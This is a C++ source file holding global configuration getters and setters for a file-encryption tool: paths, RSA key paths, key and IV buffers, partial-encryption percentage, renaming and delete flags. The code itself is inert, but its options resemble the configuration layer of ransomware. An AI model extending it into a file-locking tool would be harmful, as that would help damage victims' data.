#include <cstddef>
#include <cstring>
#include "global_parameters.h"
#include "memory.h"

/*		default		*/
STATIC int g_Encrypt = 0;
STATIC int g_DeCrypt = 0;
STATIC WCHAR* g_Path = NULL;
STATIC WCHAR* g_PathRSAKey = NULL;
STATIC WCHAR* g_PathSignRSAKey = NULL;
STATIC int g_EncryptMode = FULL_ENCRYPT;
STATIC int g_EncryptCat = DIR_CAT;
STATIC BOOL g_Status = TRUE;
STATIC int g_Percent = 20;
STATIC unsigned char* g_Key = NULL;
STATIC unsigned char* g_IV = NULL;
STATIC BOOL g_DropMode = FALSE;
STATIC unsigned long g_BitKey = 0x08000000;
STATIC BOOL g_print_hex = FALSE;
STATIC int g_CryptName = 0;
STATIC BOOL g_FlagDelete = FALSE;

VOID global::SetEncrypt(int Encrypt)
{
	g_Encrypt = Encrypt;
}

int global::GetEncrypt()
{
	return g_Encrypt;
}

VOID global::SetDeCrypt(int DeCrypt)
{
	g_DeCrypt = DeCrypt;
}

int global::GetDeCrypt()
{
	return g_DeCrypt;
}

VOID global::SetPath(WCHAR* set_path)
{
	g_Path = set_path;
}

WCHAR* global::GetPath()
{
	return g_Path;
}

VOID global::SetPathRSAKey(WCHAR* set_path)
{
	g_PathRSAKey = set_path;
}

WCHAR* global::GetPathRSAKey()
{
	return g_PathRSAKey;
}

VOID global::SetPathSignRSAKey(WCHAR* path_sing)
{
	g_PathSignRSAKey = path_sing;
}

WCHAR* global::GetPathSignRSAKey()
{
	return g_PathSignRSAKey;
}

VOID global::SetEncMode(int EncryptMode)
{
	g_EncryptMode = EncryptMode;
}

int global::GetEncMode()
{
	return g_EncryptMode;
}

VOID global::SetEncCat(int EncCat)
{
	g_EncryptCat = EncCat;
}

int global::GetnEncCat()
{
	return g_EncryptCat;
}

VOID global::SetStatus(BOOL Status)
{
	g_Status = Status;
}

BOOL global::GetStatus()
{
	return g_Status;
}

VOID global::SetKey(unsigned char* key)
{
	g_Key = key;
}

unsigned char* global::GetKey()
{
	return g_Key;
}

VOID global::SetIV(unsigned char* iv)
{
	g_IV = iv;
}

unsigned char* global::GetIV()
{
	return g_IV;
}

VOID global::SetBitKey(unsigned long bit)
{
	g_BitKey = bit;
}

unsigned long global::GetBitKey()
{
	return g_BitKey;
}

VOID global::SetRsaBase64(BOOL status)
{
	g_DropMode = status;
}

BOOL global::GetRsaBase64()
{
	return g_DropMode;
}

VOID global::SetPrintHex(BOOL hex)
{
	g_print_hex = hex;
}

BOOL global::GetPrintHex()
{
	return g_print_hex;
}

VOID global::SetCryptName(int name)
{
	g_CryptName = name;
}

int global::GetCryptName()
{
	return g_CryptName;
}

VOID global::SetFlagDelete(BOOL flag)
{
	g_FlagDelete = flag;
}

BOOL global::GetFlagDelete()
{
	return g_FlagDelete;
}

VOID global::free_global()
{
	if (g_Key)
	{
		memset(g_Key, 0, 32);
		memory::m_free(g_Key);
		g_Key = NULL;
	}
	if (g_IV)
	{
		memset(g_IV, 0, 8);
		memory::m_free(g_IV);
		g_IV = NULL;
	}
	if (g_PathRSAKey)
	{
		memory::m_free(g_PathRSAKey);
		g_PathRSAKey = NULL;
	}

	if (g_Path)
	{
		memory::m_free(g_Path);
		g_Path = NULL;
	}

	if (g_PathSignRSAKey)
	{
		memory::m_free(g_PathSignRSAKey);
		g_PathSignRSAKey = NULL;
	}
}